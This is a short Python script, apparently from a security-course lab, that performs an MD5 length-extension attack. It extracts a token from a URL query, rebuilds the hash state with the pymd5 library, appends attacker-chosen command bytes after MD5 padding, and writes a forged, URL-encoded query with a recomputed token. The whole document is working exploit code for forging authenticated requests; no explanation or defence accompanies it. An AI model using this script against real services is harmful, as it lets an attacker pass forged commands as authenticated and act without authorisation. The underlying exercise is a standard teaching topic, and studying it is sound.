import sys
from urllib.parse import quote
from pymd5 import md5, padding

# open file
with open(sys.argv[1], 'r') as f:
    query = f.read().strip()

with open(sys.argv[2], 'r') as f:
    extend_command = f.read().strip()
extend_command_byte = bytes(extend_command, 'latin-1')
print(extend_command_byte)

out_file = open(sys.argv[3], 'w')

# extract token and extend it
token = query.split('=')[1].split('&')[0]
m_len = 8 + (len(query) - len(token) - 6) # len(8 chr pwd) + len(query) - len(token=...)
count = (m_len + len(padding(m_len*8))) * 8

print(token)
print(count)

h = md5(state=token, count=count) 
h.update(extend_command_byte)
print(h.hexdigest())

# update url and write to out
index = query.index('user')
new_url = f'token={h.hexdigest()}&{query[index:]}'
new_url = bytes(new_url, 'latin-1') + padding(m_len*8) + extend_command_byte
print(new_url)
new_url = quote(new_url)
out_file.write(new_url)
